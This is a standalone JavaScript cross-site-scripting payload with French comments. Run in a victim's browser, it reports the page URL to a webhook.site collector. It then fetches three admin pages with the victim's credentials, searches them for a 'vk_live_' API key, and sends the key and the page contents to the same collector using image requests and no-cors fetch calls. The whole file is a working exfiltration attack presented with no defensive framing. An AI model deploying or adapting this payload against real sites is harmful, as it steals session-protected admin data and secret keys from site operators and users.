(async () => {
  const receiver = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";

  // Fonction pour envoyer des données via GET (plus fiable)
  function sendData(data) {
    const encoded = encodeURIComponent(JSON.stringify(data));
    // Limiter la taille pour éviter les problèmes
    if (encoded.length < 2000) {
      const img = new Image();
      img.src = `${receiver}?data=${encoded}`;
    } else {
      // Pour les gros messages, on utilise fetch en no-cors
      fetch(receiver, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(data)
      });
    }
  }

  // Envoyer l'URL actuelle
  sendData({ type: "alive", url: location.href });

  // Lire les pages admin
  for (const path of ["/admin/", "/admin/review.php", "/admin/search.php"]) {
    try {
      const response = await fetch(path, {
        credentials: "include"
      });

      const body = await response.text();
      
      // Chercher l'API key
      const apiKey = body.match(/vk_live_[a-f0-9]{40}/);
      if (apiKey) {
        sendData({ type: "api_key", key: apiKey[0], path: path });
      }

      // Envoyer le contenu (tronqué si trop long)
      sendData({
        type: "page",
        path: path,
        content: body.substring(0, 3000)
      });

    } catch (error) {
      sendData({ type: "error", path: path, error: String(error) });
    }
  }
})();
